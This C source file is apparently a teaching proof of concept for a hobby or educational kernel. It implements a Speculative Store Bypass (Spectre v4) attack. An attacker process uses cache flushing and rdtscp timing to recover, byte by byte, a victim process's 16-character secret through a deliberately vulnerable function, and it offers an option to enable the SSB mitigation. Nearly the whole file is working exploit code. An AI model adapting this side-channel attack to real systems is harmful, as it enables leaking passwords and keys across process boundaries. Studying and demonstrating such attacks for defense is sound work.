#include <all.h>

#define SECRET_LEN 16
#define MAX_TRIES 2000
#define VPAG_SIZE 4096

unsigned char **memory_slot_ptr[300];
unsigned char *memory_slot[300];

unsigned char public_key[] = "0123456789abcdef";

uint8_t probe[256 * VPAG_SIZE];

volatile uint8_t tmp = 0;

natl attacker_sincr;
natl victim_sincr;
unsigned int index;
bool finished = false;

// Calculate time to access memory address
int time_access(uint8_t *addr)
{
	unsigned int junk = 0;
	uint64_t time1 = __rdtscp(&junk);
	junk = *addr;
	uint64_t time2 = __rdtscp(&junk) - time1;
	return time2;
}

// Calculate cache hit threshold
int calc_threshold()
{
	unsigned int mean_hit = 0;
	unsigned int mean_miss = 0;

	// Calculate cycles for hit
	for (int i = 0; i < MAX_TRIES; i++)
	{
		for (int j = 0; j < 256; j++)
		{
			probe[j * VPAG_SIZE] = 1;
		}
		for (int j = 0; j < 256; j++)
		{
			mean_hit += time_access(&probe[j * VPAG_SIZE]);
		}
	}
	mean_hit /= MAX_TRIES * 256;

	// Calculate cycles for miss
	for (int i = 0; i < MAX_TRIES; i++)
	{
		for (int j = 0; j < 256; j++)
		{
			flushCacheLine(&probe[j * VPAG_SIZE]);
		}
		for (int j = 0; j < 256; j++)
		{
			mean_miss += time_access(&probe[j * VPAG_SIZE]);
		}
	}
	mean_miss /= MAX_TRIES * 256;

	int threshold = (mean_hit + mean_miss) / 2;
	printf("Mean number of cycles for cache:\nhit: %d, miss: %d, threshold: %d\n\n", mean_hit, mean_miss, threshold);
	return threshold;
}

// Attacker process
void attacker_func(natq a)
{
	char retrieved_secret[SECRET_LEN + 1] = {'\0'};

	unsigned int CACHE_HIT_THRESHOLD = calc_threshold();

	for (int idx = 0; idx < SECRET_LEN; ++idx)
	{
		int results[256] = {0};
		for (int tries = 0; tries < MAX_TRIES; tries++)
		{

			memory_slot_ptr[0] = memory_slot;

			flushCacheLine(memory_slot_ptr);
			for (int i = 0; i < 256; i++)
			{
				flushCacheLine(&probe[i * VPAG_SIZE]);
			}

			index = idx;
			sem_signal(victim_sincr);
			sem_wait(attacker_sincr);

			for (int i = 0; i < 256; i++)
			{
				uint64_t time = time_access(&probe[i * VPAG_SIZE]);

				if (time <= CACHE_HIT_THRESHOLD && i != public_key[idx])
				{
					// Cache hit with char different from public key
					results[i]++;
				}
			}
		}

		int highest = 0;
		for (int i = 0; i < 256; i++)
		{
			if (results[i] > results[highest])
			{
				highest = i;
			}
		}
		printf("highest: %c, hits: %d, hit rate: %d%%\n", highest, results[highest], results[highest] * 100 / MAX_TRIES);
		retrieved_secret[idx] = highest;
	}
	printf("Retrieved secret: %s\n", retrieved_secret);

	finished = true;
	sem_signal(victim_sincr);

	pause();
	terminate_p();
}

char response[1];

// Function to select if SSB is enabled or disabled
void ssbd_ask()
{
	do
	{
		printf("\r%50s\r", ""); // Clear line
		printf("Disable Speculative Store Bypass? (y/N): ");
		readconsole(response, 1);
	} while (response[0] != 'y' && response[0] != 'Y' &&
			 response[0] != 'n' && response[0] != 'N' &&
			 response[0] != 0);

	switch (response[0])
	{
	case 'y':
	case 'Y':
		ssb_ctrl(PR_SPEC_DISABLE);
		printf("\n\n");
		break;
	case 'n':
	case 'N':
		ssb_ctrl(PR_SPEC_ENABLE);
		printf("\n\n");
		break;
	case 0: // Invio (Default: n)
		ssb_ctrl(PR_SPEC_ENABLE);
		printf("\n");
		break;
	}
}

// Function with SSB vulnerability
void vuln_function(size_t idx)
{
	// When entering the function:
	// memory_slot_ptr[0] = memory_slot; And memory_slot_ptr is not in cache
	// memory_slot[0] = secret_key;
	unsigned char **memory_slot_slow_ptr = memory_slot_ptr[0];
	// __lfence();
	memory_slot_slow_ptr[0] = public_key;
	tmp = probe[(memory_slot[0])[idx] * VPAG_SIZE];
}

// Victim process
void victim_func(natq a)
{

	unsigned char secret_key[] = "PASSWORD_SEGRETA";

	ssbd_ask();

	while (1)
	{
		sem_wait(victim_sincr);
		if (finished)
		{
			break;
		}
		memory_slot[0] = secret_key;
		vuln_function(index);
		sem_signal(attacker_sincr);
	}

	terminate_p();
}

natl attacker;
natl victim;

extern "C" void main()
{
	attacker_sincr = sem_ini(0);
	victim_sincr = sem_ini(0);

	attacker = activate_p(attacker_func, 0, 5, LIV_UTENTE);
	victim = activate_p(victim_func, 0, 5, LIV_UTENTE);

	terminate_p();
}
